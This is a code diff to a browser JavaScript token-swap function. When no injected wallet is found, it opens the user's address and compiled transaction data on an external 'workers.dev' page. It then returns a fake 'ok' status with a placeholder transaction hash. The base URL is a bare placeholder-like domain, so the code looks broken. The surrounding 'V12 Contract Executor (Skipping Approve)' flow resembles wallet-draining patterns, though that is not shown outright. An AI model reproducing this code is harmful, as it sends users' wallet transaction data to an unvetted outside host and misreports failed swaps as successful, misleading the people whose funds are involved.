@@ -104,6 +104,18 @@ async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, target
             throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
         }
 
+        // 🟢 FIXED: If window.ethereum doesn't exist, redirect to your worker deep-link page with tx metrics
+        if (!window.ethereum || typeof window.ethereum.request !== "function") {
+            logToPanel(`🔄 Mobile Context: Opening transaction interface gateway on Worker micro-frontend...`);
+            
+            const workerBaseUrl = "https://workers.dev";
+            const txQueryParam = `?action=swap&to=${V12_ADDR}&data=${backendPayload.swap_packet.compiled_data}&from=${cleanUser}`;
+            
+            // This safely opens a new tab or deep-links directly to prompt your WalletConnect app setup
+            window.open(workerBaseUrl + txQueryParam, "_blank");
+            return { status: "ok", tx_hash: "REDIRECTED_TO_WORKER" };
+        }
+
         logToPanel(`📢 [SWAP PROMPT] Dispatched directly to V12 Contract Executor (Skipping Approve)...`);
         const swapTxHash = await window.ethereum.request({
             method: "eth_sendTransaction",
@@ -123,6 +135,9 @@ async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, target
     }
 }
 window.runbscSwapUniswap = runbscSwapUniswap;
+
+
+
 
 async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
     try {
